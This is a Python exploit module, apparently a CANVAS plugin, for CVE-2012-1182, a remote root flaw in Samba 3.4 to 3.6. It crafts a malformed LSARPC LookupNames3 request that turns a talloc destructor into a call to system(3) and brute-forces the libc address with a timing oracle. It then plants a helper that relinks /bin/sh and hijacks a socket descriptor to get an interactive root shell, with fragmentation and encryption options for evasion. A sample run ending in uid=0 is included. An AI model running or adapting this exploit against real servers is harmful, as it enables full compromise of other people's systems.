VERSION = '0.1'
NAME = 'CVE-2012-1182'
DESCRIPTION = 'CVE-2012-1182: SAMBA 3.4.x/3.5.x/3.6.x remote root'

DOCUMENTATION = {}
DOCUMENTATION['VENDOR'] = 'Samba'
DOCUMENTATION['Date Public'] = '04/10/2012'
DOCUMENTATION['CVE Name'] = 'CVE-2012-1182'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-CVE-2012-1182'
DOCUMENTATION['CVSS'] = 0.0
DOCUMENTATION['References'] = 'http://www.samba.org'
DOCUMENTATION['Repeatability'] = 'Repeatable'

PROPERTY = {}
PROPERTY['TYPE'] = 'Exploit'
PROPERTY['SITE'] = 'Remote'
PROPERTY['ARCH'] = [['Linux']]

NOTES = """
This is for NX enabled Linux i686, if there is no NX one can construct a completely targetless
attack using one of several primitives available. If there is a demand for such a target
platform support please let us know. Likewise X64 attacks are workable, but without a memory
disclosure the bruting timeframe is less than practical. If there is a demand for X64
support we can however release an X64 version of this attack for lab testing.

Example run vs Ubuntu 11.10 i686, this uses the python shell node to establish a fully
encrypred AES128 shell to the target host.

[bas@dev canvas]$ python ./exploits/CVE_2012_1182/CVE_2012_1182.py -v4 -t192.168.36.132
...
[ Wed Apr 11 13:58:22 2012 ] [C] (192.168.36.132/32) ### Searching: 00ff4b20
[ Wed Apr 11 13:58:22 2012 ] [C] (192.168.36.132/32) ### Searching: 00ff5b20
[ Wed Apr 11 13:58:22 2012 ] [C] (192.168.36.132/32) ### Searching: 00ff6b20
[ Wed Apr 11 13:58:26 2012 ] [C] (192.168.36.132/32) ### Located possible system(3) ptr: 00ff6b20
[ Wed Apr 11 13:58:26 2012 ] [C] (192.168.36.132/32) ### Transferring helper script to target ...
[ Wed Apr 11 13:58:26 2012 ] [C] (192.168.36.132/32) ### Transferred a byte ...
[ Wed Apr 11 13:58:26 2012 ] [C] (192.168.36.132/32) ### Transferred a byte ...
[ Wed Apr 11 13:58:26 2012 ] [C] (192.168.36.132/32) ### Transferred a byte ...
[ Wed Apr 11 13:58:26 2012 ] [C] (192.168.36.132/32) ### Transferred a byte ...
[ Wed Apr 11 13:58:26 2012 ] [C] (192.168.36.132/32) ### Transferred a byte ...
[ Wed Apr 11 13:58:26 2012 ] [C] (192.168.36.132/32) ### Transferred a byte ...
[ Wed Apr 11 13:58:26 2012 ] [C] (192.168.36.132/32) ### Transferred a byte ...
[ Wed Apr 11 13:58:26 2012 ] [C] (192.168.36.132/32) ### Transferred a byte ...
[ Wed Apr 11 13:58:26 2012 ] [C] (192.168.36.132/32) ### Transferred a byte ...
[ Wed Apr 11 13:58:26 2012 ] [C] (192.168.36.132/32) ### Transferred a byte ...
[ Wed Apr 11 13:58:26 2012 ] [C] (192.168.36.132/32) ### Transferred a byte ...
[ Wed Apr 11 13:58:26 2012 ] [C] (192.168.36.132/32) ### Transferred a byte ...
[ Wed Apr 11 13:58:26 2012 ] [C] (192.168.36.132/32) ### Transferred a byte ...
[ Wed Apr 11 13:58:26 2012 ] [C] (192.168.36.132/32) ### Transferred a byte ...
[ Wed Apr 11 13:58:26 2012 ] [C] (192.168.36.132/32) ### Transferred a byte ...
[ Wed Apr 11 13:58:26 2012 ] [C] (192.168.36.132/32) ### Transferred a byte ...
[ Wed Apr 11 13:58:26 2012 ] [C] (192.168.36.132/32) ### Transferred a byte ...
[ Wed Apr 11 13:58:26 2012 ] [C] (192.168.36.132/32) ### Transferred a byte ...
[ Wed Apr 11 13:58:27 2012 ] [C] (192.168.36.132/32) ### Transferred a byte ...
[ Wed Apr 11 13:58:27 2012 ] [C] (192.168.36.132/32) ### Transferred a byte ...
[ Wed Apr 11 13:58:27 2012 ] [C] (192.168.36.132/32) ### Transferred a byte ...
[ Wed Apr 11 13:58:27 2012 ] [C] (192.168.36.132/32) ### Transferred a byte ...
[ Wed Apr 11 13:58:27 2012 ] [C] (192.168.36.132/32) ### Transferred a byte ...
[ Wed Apr 11 13:58:27 2012 ] [C] (192.168.36.132/32) ### Transferred a byte ...
[ Wed Apr 11 13:58:27 2012 ] [C] (192.168.36.132/32) ### File transferred ... trying to run helper to relink /bin/sh
to /bin/bash ...
[ Wed Apr 11 13:58:27 2012 ] [C] (192.168.36.132/32) ### Checking fd: 0
[ Wed Apr 11 13:58:27 2012 ] [C] (192.168.36.132/32) ### Checking fd: 1
[ Wed Apr 11 13:58:27 2012 ] [C] (192.168.36.132/32) ### Checking fd: 2
[ Wed Apr 11 13:58:27 2012 ] [C] (192.168.36.132/32) ### Checking fd: 3
[ Wed Apr 11 13:58:27 2012 ] [C] (192.168.36.132/32) ### Checking fd: 4
[ Wed Apr 11 13:58:27 2012 ] [C] (192.168.36.132/32) ### Checking fd: 5
[ Wed Apr 11 13:58:27 2012 ] [C] (192.168.36.132/32) ### Checking fd: 6
[ Wed Apr 11 13:58:31 2012 ] [C] (192.168.36.132/32) ### False positive ...
[ Wed Apr 11 13:58:31 2012 ] [C] (192.168.36.132/32) ### Checking fd: 7
[ Wed Apr 11 13:58:31 2012 ] [C] (192.168.36.132/32) ### Checking fd: 8
### Seems like a win ... dumping interact cmd 
[ Wed Apr 11 13:58:31 2012 ] [C] (192.168.36.132/32)  10:58:15 up 13 days, 17 min,  2 users,  load average: 0.37,
34.21, 76.23
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
user     pts/0    :0               29Mar12 20:09  31:16  17.85s gnome-terminal
user     pts/1    :0               29Mar12  6:06   0.35s 17.85s gnome-terminal
[ Wed Apr 11 13:58:31 2012 ] [C] (192.168.36.132/32) ### Found potential client fd: 8
[ Wed Apr 11 13:58:31 2012 ] [C] (192.168.36.132/32) ### Stage 2 success ... we can execute commands interactively
:D
[ Wed Apr 11 13:58:31 2012 ] [C] (192.168.36.132/32) ### Escalating to CANVAS shell, this may take a while ...
[+] Setting up AES128 over RSA2048 ... this may take a while ...
[+] Constructing RSA publickey
[+] RSA2048 succeeded ... initializing AES128
[+] init_aes result succeeded
[ Wed Apr 11 13:58:35 2012 ] [C] (192.168.36.132/32) ### All done ...
[C] Module succeeded!
>>> $ id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)

>>> $
"""

import sys
import struct
import time
import os
import select
import re

if '.' not in sys.path:
    sys.path.append('.')

from libs.ctelnetlib import Telnet
from libs.newsmb import libdcerpc

from exploitutils import *
from shelllistener import *
from tcpexploit import tcpexploit

import unixShellNode
from pythonUnixShell import *

# if this is not working for you, try debugging by pmap `pgrep smbd` set the search range start to match
# the libc.so .text base e.g. 00fba000   1504K r-x--  /lib/i386-linux-gnu/libc-2.13.so, please debug from
# a fresh instance of smbd (make sure there aren't a lot of defunct smbd's around from prior bruting runs)

VERSIONS = { 
    # search for system(3) ... the offset is the page offset of system(3) from libc (objdump -t libc.so|grep system)
    0 : ('Linux IA32 NX (Slow Brute(TM)) 3.4.x, Fedora Core 12 i686', [(0x00110000, 0x03000000), (0xb6930000, 0xb8000000)], 0x880),
    1 : ('Linux IA32 NX (Slow Brute(TM)) 3.5.x, Fedora Core 13 i686', [(0x00110000, 0x03000000), (0xb6930000, 0xb8000000)], 0xdc0),
    2 : ('Linux IA32 NX (Slow Brute(TM)) 3.5.x, Fedora Core 14 i686', [(0x00110000, 0x03000000), (0xb6930000, 0xb8000000)], 0xeb0),
    3 : ('Linux IA32 NX (Slow Brute(TM)) 3.5.x, Ubuntu 11.04 i686', [(0x00110000, 0x03000000), (0xb6930000, 0xb8000000)], 0x950),
    4 : ('Linux IA32 NX (Slow Brute(TM)) 3.6.x, Ubuntu 11.10 i686', [(0x00110000, 0x03000000), (0xb6930000, 0xb8000000)], 0xb20),

    # for debugging ranges ... pmap `pgrep smbd`|grep libc
    5 : ('Linux IA32 NX (Test Brute(TM))', [(0x00fba000, 0x01000000)], 0xb20),
    6 : ('Linux IA32 NX (Test Brute(TM))', [(0x00eb5000, 0x01000000)], 0xdc0),
    7 : ('Linux IA32 NX (Test Brute(TM))', [(0x00e9a000, 0x01000000)], 0xeb0),
    8 : ('Linux IA32 NX (Test Brute(TM))', [(0x00e94000, 0x01000000)], 0x950)
}

# TCP timeout
TIMEOUT = 40

TIMEOUT_INCR = 5
TIMEOUT_CHAR = 5

class XError(Exception):    
    def __init__(self, v): 
        self.v = v 

    def __str__(self):
        return repr(self.v)

class Terminate(Exception):
    pass


class Samba:
    def __init__(self, host, privacy=True, frag_level=None, getsock=None):
        self.dce = libdcerpc.DCERPC(u'ncacn_np:%s[\\lsarpc]' % host, frag_level=frag_level, getsock=getsock)
        
        if privacy == False:
            if not self.dce.bind(u'12345778-1234-abcd-ef00-0123456789ab', u'0.0'):
                raise XError, 'Could not bind to LSARPC ...'
        else:
            if not self.dce.bind(u'12345778-1234-abcd-ef00-0123456789ab', u'0.0',
                libdcerpc.RPC_C_AUTHN_WINNT, libdcerpc.RPC_C_AUTHN_LEVEL_PKT_PRIVACY):
                raise XError, 'Could not bind to LSARPC ...'

    def x_align(self, data, align):
        if len(data) % align:
            #print '### Aligning data on: %d' % align
            return data + 'P' * (align - (len(data) % align))
        else:
            return data

    def ndr_push_lsa_LookupNames3(self, destructor, cmd):
        generic_ptr_seed = 0xdeadc0de
        data = ''

        # for a clean destructor call primitive ...
        alloc_size = 1
        write_size = alloc_size + 4
        write_offs = []

        write_offs.append(alloc_size + 3)
        write_offs.append(alloc_size + 2)
        write_offs.append(alloc_size + 1)

        # ndr_pull_policy_handle
        data = self.x_align(data, 4)
        data += struct.pack('<L', 0) # handle type
        data = self.x_align(data, 4)
        data += struct.pack('<L', 0) # time_low
        data = self.x_align(data, 2)
        data += struct.pack('<H', 0) # time_mid
        data += struct.pack('<H', 0) # time_hi_and_version
        data += 'A' * 2 # clock_seq
        data += 'A' * 6 # node

        # r->in.num_names
        data = self.x_align(data, 4)
        data += struct.pack('<L', 0) # set names to 0

        # array size
        #
        # there is another ovf here, but it runs into
        # charset conversions at ndr_pull_lsa_String which is annoying
        # so we skip it and go to the sid data which provides the control
        # needed for our generic NX Samba exploitation strategy
        data = self.x_align(data, 4)
        data += struct.pack('<L', 0) # skip the ndr_pull_lsa_String overflow

        # ndr_pull_lsa_TransSidArray3
        data = self.x_align(data, 4)
        data += struct.pack('<L', write_size) # r->count write size
        data += struct.pack('<L', generic_ptr_seed); generic_ptr_seed += 1 # init r->sids

        data += struct.pack('<L', alloc_size) # alloc array size
        # first feed NDR_SCALARS ... init with NULL or ALLOC
        for i in range(0, write_size):
            if i not in write_offs:
                data = self.x_align(data, 4)
                data = self.x_align(data, 2)
                data += struct.pack('<H', 0x4141) # r->sid_type
                data = self.x_align(data, 4)
                data += struct.pack('<L', 0) # generic_ptr NULL, write NULL
                data += struct.pack('<L', 0) # r->sid_index
                data += struct.pack('<L', 0) # r->flags
            else:
                data = self.x_align(data, 4)
                data = self.x_align(data, 2)
                data += struct.pack('<H', 0x4242) # r->sid_type
                data = self.x_align(data, 4)
                data += struct.pack('<L', generic_ptr_seed); generic_ptr_seed += 1
                data += struct.pack('<L', 0) # r->sid_index
                data += struct.pack('<L', 0) # r->flags

        # feed the actual SID data, NDR_BUFFERS
        for i in range(0, write_size):

            # we write ptrs to this data ... num_auths has to be > 0 < 15
            # we control everything else ...

            if i in write_offs:
                # ndr_pull_dom_sid2
                num_auths = 8
                data = self.x_align(data, 4)
                data += struct.pack('<L', num_auths) # num_auths checked vs. sid->num_auths
                data += struct.pack('B', 0x41) # sid->sid_rev_num
                data += struct.pack('B', num_auths) # sid->num_auths

                """
                Program received signal SIGSEGV, Segmentation fault.
                0xcafebabe in ?? ()
                (gdb) x/2x $esp
                0xbfa7644c:     0x002459f9      0x013c4fb0
                (gdb) x/s 0x013c4fb0
                0x13c4fb0:       "A\bPPPPPPAAAAAAAA"
                (gdb) 
                """

                data += cmd; data += (14 - len(cmd)) * '\x00' # pad with terminators

                # we're gonna abuse a nice talloc layout to get a destructor call to system(3) with controlled data ;)
                data += struct.pack('<L', 0) # refs ... keep at NULL ... also serves as nul terminator for cmd
                data += struct.pack('<L', destructor) # destructor
                data += struct.pack('<L', 0) # name
                data += struct.pack('<L', 0) # size
                data += struct.pack('<L', 0xe8150c70) # flags, set the loop flag for a quick return from talloc_free, before the destructor is called
                data += struct.pack('<L', 0) # pool

        # talloc should be erroring out by here anyways ... so don't fill in ...
        self.dce.call(68, data, response=False)
        return self.dce.dcerpc_connection.s


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name       = NAME
        self.version    = 0
        self.host       = ''
        self.port       = 445
        self.timeout    = 2
        self.threshold  = 0.2
        self.debug      = False
        self.privacy    = False
        self.frag_level = None


    def displayVersions(self):
        for v in VERSIONS:
            print '%d - %s' % (v, VERSIONS[v][0])

    def get_args(self):
        self.getarg("port")
        
        self.timeout   = float(self.argsDict.get("timeout", self.timeout))
        self.threshold = float(self.argsDict.get("threshold", self.threshold))

    def gettccpsock(self, *args, **kwargs):
        s = tcpexploit.gettcpsock(self, args, kwargs)
        s.set_timeout(TIMEOUT)
        
        return s
    
    def find_system_ptr(self, brute_base, brute_top, brute_off):
        for PAGE_BASE in range(brute_base, brute_top, 0x1000):

            if self.getState() == self.HALT:
                raise Terminate()
            
            if self.debug == True:
                self.log('### Attach ... and press enter on console'); sys.stdin.readline()
            try:
                self.log('### Searching: %.8x' % (PAGE_BASE + brute_off))
                x = Samba(self.host, privacy=self.privacy, frag_level=self.frag_level, getsock=self)
                
                # timeout indicates possible success here ...
                sock = x.ndr_push_lsa_LookupNames3(PAGE_BASE + brute_off, ';sleep %s' % self.timeout)

                start = time.time()
                rd, wr, ex = select.select([sock], [], [], self.timeout+TIMEOUT_INCR)
                elapsed = time.time() - start

                diff = abs(elapsed-self.timeout)/((elapsed+self.timeout)/2.0)

                if diff <= self.threshold:
                    self.log('Timeout: %s, Actual: %s, Threshold: %s, Difference: %s' % (self.timeout, elapsed, self.threshold, diff))
                    self.log('### Located possible system(3) ptr: %.8x' % (PAGE_BASE + brute_off))
                    return PAGE_BASE + brute_off
                
            except XError:
                self.log('Could not connect to remote server')
                raise
            except Terminate:
                raise
            except Exception:
                continue

        self.log('### Could not locate system(3) ...')
        return 0

    def find_client_fd(self, system_ptr, search_range=50, timeout=10):
        # so we can get interactive shells on say, ubuntu, we try to relink away from /bin/dash to /bin/bash
        helper = 'ln -sf /bin/bash /bin/sh'

        # echo our helper over ...
        self.log('### Transferring helper script to target ...')

        # cleanup stale ones ...
        try:
            x = Samba(self.host, privacy=self.privacy, frag_level=self.frag_level, getsock=self)
            sock = x.ndr_push_lsa_LookupNames3(system_ptr, ';rm -f ./x')
            rd, _, _ = select.select([sock], [], [], TIMEOUT_CHAR)
            if len(rd): rd[0].recv(0x1000)
            sock.close()
        except Exception:
            pass # not fatal

        for c in helper:
            try:
                x = Samba(self.host, privacy=self.privacy, frag_level=self.frag_level, getsock=self)
                sock = x.ndr_push_lsa_LookupNames3(system_ptr, ';echo -n \\%c>>x' % c) # 14 chars ... exactly
                rd, _, _ = select.select([sock], [], [], TIMEOUT_CHAR)
                if len(rd): rd[0].recv(0x1000)
                sock.close()
                self.log('### Transferred a byte ...')
            except Exception:
                self.log('### echo of helper failed ... non fatal')
                break

        self.log('### File transferred ... trying to run helper to relink /bin/sh to /bin/bash ...')

        try:
            # this has to use bash, as it will scrub our euid and bring us back to root for the perms we need
            x = Samba(self.host, privacy=self.privacy, frag_level=self.frag_level, getsock=self)
            sock = x.ndr_push_lsa_LookupNames3(system_ptr, ';bash x')
            rd, _, _ = select.select([sock], [], [], TIMEOUT_CHAR)
            if len(rd): rd[0].recv(0x1000)
            sock.close()
        except Exception:
            import traceback
            traceback.print_exc()
            
            self.log('### exec of helper failed ... non fatal')

        # it's very important that we always close our open sockets to drop lingering children!
        # and to keep a deterministic client fd value ...

        for fd in range(0, search_range+1):
            if fd in range(10, 20+1):
                continue # skip the TDB file fd's ... but not 0-9

            self.log('### Checking fd: %d' % fd)

            sock = None
            
            try:
                x = Samba(self.host, privacy=self.privacy, frag_level=self.frag_level, getsock=self)
                # try to escalate to full shell on the fd we find data on in one go ...
                sock = x.ndr_push_lsa_LookupNames3(system_ptr, ';w>&%d;sh<&%d' % (fd, fd))
                rd, wr, ex = select.select([sock], [], [], timeout)

                if len(rd):
                    r = rd[0].recv(0x1000)

                    if len(r):
                        os.write(sock.fileno(), 'sh<&%d 2>&%d 1>&%d\n' % (fd, fd, fd)) # this only works on shells that support double redir and high fd's like bash
                        self.log(r)
                        self.log('### Found potential client fd: %s' % fd)

                        return fd, sock
                else:
                    self.log('### False positive ...')
                    sock.close()
                    continue
                    
            except Exception:
                if sock: sock.close()

        self.log('### Could not find client fd ...')
        return -1, 0

    def brute(self, desc, brute_range, brute_off):
        self.log('### Computer Hacking: %s (off: %.8x)' % (desc, brute_off))
        self.log('### Trying map range: %.8x-%.8x' % (brute_range[0], brute_range[1]))
        system_ptr = self.find_system_ptr(brute_range[0], brute_range[1], brute_off) # base, top, off
        
        if not system_ptr:
            return None, False

        fd, s = self.find_client_fd(system_ptr)
        
        if fd == -1:
            self.log('### Could not find client fd ... target /bin/sh linked to POSIX-strict shell like Dash?')
            self.log('### Treating failure as false positive ... (this is probably what you want)')
            return system_ptr + 0x1000 - brute_off, False

        self.log('### Stage 2 success ... we can execute commands interactively :D')
        self.log('### Escalating to CANVAS shell, this may take a while ...')

        # there's a bit of a tradeoff by going to /bin/bash ... we lose 2 fd width chars, but fd's > 100 are
        # unlikely to occur on non-busy targets ... by going through bash we ensure that our double re-direct
        # works as expected ... we also have the advantage of it scrubbing our effective uid of nobody so
        # our root privs work as expected ... so the width tradeoff is worth it IMO

        try:
            # we _SHOULD_ have a shell waiting on s for us at this point ...
            tn = Telnet()
            tn.sock = s

            #tn.sock.send('id|sed s/i/1/g|sed s/o/0/g;HISTFILE=/dev/null bash -i\n')
            #return tn,True # XXX: if you prefer a regular telnet shell on the cmdline, use this
            # CANVAS specific
            node = unixShellNode.unixShellNode()
            node.parentnode = self.argsDict['passednodes'][0]
            node.shell = shelllistener(shellfromtelnet(tn), simpleShell=1)
            
            return node, True
        except Exception:
            import traceback
            traceback.print_exc(file=sys.stdout)
            self.log('### Skipping false positive!')
            return system_ptr + 0x1000 - brute_off, False

    def run(self):
        self.get_args()
        self.host = self.target.interface
                 
        if self.version not in VERSIONS:
            self.log('### Error: no such version')
            return None

        if self.covertness >= 2:
            self.log("DCERPC crypto enabled, set covertness to 1 and try again if exploit fails!")
            self.privacy = True

        if self.covertness >= 5 and self.covertness < 11:
            self.log('Crypto + moderate SMB fragmentation')
            self.frag_level = 1
        elif self.covertness == 11:
            self.log('Crypto + MAX fragmentation (VERY SLOW)')
            self.frag_level = 2
            
        try:
            desc, brute_ranges, brute_off = VERSIONS[int(self.version)]
            
            self.log('Attacking %s:%s using: %s' % (self.host, self.port, desc))
            
            for brute_range in brute_ranges:
                base = brute_range[0]
                done = False
                
                while base:
                    base,done = self.brute(desc, (base, brute_range[1]), brute_off)
                    if done == True: # base represents a telnet shell in this case
                        self.log('### All done ...')
                        self.setInfo('%s - done (SUCCESS)' % NAME)
                        return base
        except Terminate:
            pass
        except Exception:
            self.setInfo('%s - done (ERROR)' % NAME)

        return 0

if __name__ == '__main__':
    app = theexploit()
    ret = standard_callback_commandline(app)
    
    if hasattr(ret, 'interact') == True:
        ret.interact()
